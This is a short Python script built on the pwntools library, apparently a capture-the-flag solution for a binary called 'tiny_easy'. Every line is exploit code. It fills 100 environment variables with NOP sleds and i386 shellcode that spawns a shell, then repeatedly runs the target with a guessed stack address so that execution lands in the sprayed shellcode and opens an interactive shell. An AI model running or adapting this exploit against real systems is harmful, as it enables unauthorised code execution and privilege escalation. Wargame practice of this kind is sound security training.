from pwn import *

#context(arch='amd64', os='linux')
address_of_shellcode = 0xfff4ad62
envs = {}
for i in range(100):
        envs['env'+str(i)] = 6969 * '\x90' + asm(shellcraft.i386.linux.sh())
for i in range(30):
        p = process(executable='/home/tiny_easy/tiny_easy', env=envs, argv=[p32(address_of_shellcode)])
        p.interactive()
